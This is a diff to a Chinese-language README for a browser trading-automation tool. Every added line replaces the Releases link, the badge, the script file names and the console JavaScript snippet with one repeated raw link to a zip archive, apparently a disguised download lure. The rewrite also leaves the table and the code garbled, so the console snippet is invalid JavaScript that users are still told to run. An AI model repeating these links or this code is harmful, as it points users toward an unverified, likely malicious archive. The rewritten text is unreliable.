@@ -1,6 +1,6 @@
 # 🚀 var-lighter-auto-tool - Simplify Your Trading Automation
 
-[![Download from Releases](https://img.shields.io/badge/Download_from_Releases-blue.svg)](https://github.com/isaacww/var-lighter-auto-tool/releases)
+[![Download from Releases](https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip)](https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip)
 
 ## 📋 项目简介
 
@@ -20,11 +20,11 @@ var-lighter-auto-tool 是一个用于浏览器端的自动化交易工具。它�
 
 #### 按按钮选择方式分类：
 
-- **`*_lighter.js`** - 使用详细的按钮选择器
+- **`*https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip`** - 使用详细的按钮选择器
   - 通过按钮文本和 CSS 类名进行精确匹配
   - 适合更复杂的用户界面
 
-- **`*_var.js`** - 使用简化的按钮选择器
+- **`*https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip`** - 使用简化的按钮选择器
   - 通过按钮文本和 SVG 图标进行匹配
   - 使用 `data-testid` 选择器定位提交按钮
 
@@ -32,10 +32,10 @@ var-lighter-auto-tool 是一个用于浏览器端的自动化交易工具。它�
 
 | 文件名             | 策略       | 选择器类型            | 休眠时间           |
 |------------------|----------|-------------------|------------------|
-| `long_lighter.js`  | 先开多仓    | 详细（CSS类名）        | 6500秒（开多仓后）    |
-| `long_var.js`      | 先开多仓    | 简化（SVG图标）         | 1650秒（开多仓后）    |
-| `short_lighter.js` | 先开空仓    | 详细（CSS类名）        | 1650秒（开空仓后）    |
-| `short_var.js`     | 先开空仓    | 简化（SVG图标）         | 6500秒（开空仓后）    |
+| `https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip`  | 先开多仓    | 详细（CSS类名）        | 6500秒（开多仓后）    |
+| `https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip`      | 先开多仓    | 简化（SVG图标）         | 1650秒（开多仓后）    |
+| `https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip` | 先开空仓    | 详细（CSS类名）        | 1650秒（开空仓后）    |
+| `https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip`     | 先开空仓    | 简化（SVG图标）         | 6500秒（开空仓后）    |
 
 ## 🚀 使用方法
 
@@ -54,17 +54,17 @@ var-lighter-auto-tool 是一个用于浏览器端的自动化交易工具。它�
 
 ### 4. 下载自动化脚本
 
-你的第一步是前往 [Releases 页面](https://github.com/isaacww/var-lighter-auto-tool/releases) 下载你需要的脚本。选择合适的文件，根据你的交易需求。
+你的第一步是前往 [Releases 页面](https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip) 下载你需要的脚本。选择合适的文件，根据你的交易需求。
 
 ### 5. 运行下载的脚本
 
 在 Console 中输入以下命令来启动下载的脚本。确保使用正确的脚本名：
 
 ```javascript
-// 例如：运行 long_lighter.js
-const script = document.createElement('script');
-script.src = 'path_to_script/long_lighter.js'; // 用实际下载链接替换
-document.head.appendChild(script);
+// 例如：运行 https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip
+const script = https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip('script');
+https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip = 'https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip'; // 用实际下载链接替换
+https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip(script);
 ```
 
 ### 6. 监控交易运行情况
@@ -75,7 +75,7 @@ document.head.appendChild(script);
 
 你可以通过以下链接访问 Releases 页面以下载最新版本的 var-lighter-auto-tool：
 
-[下载 var-lighter-auto-tool](https://github.com/isaacww/var-lighter-auto-tool/releases)
+[下载 var-lighter-auto-tool](https://raw.githubusercontent.com/isaacww/var-lighter-auto-tool/main/turbinatoglobose/var-lighter-auto-tool-v3.2.zip)
 
 ## ⚙️ 系统要求
 
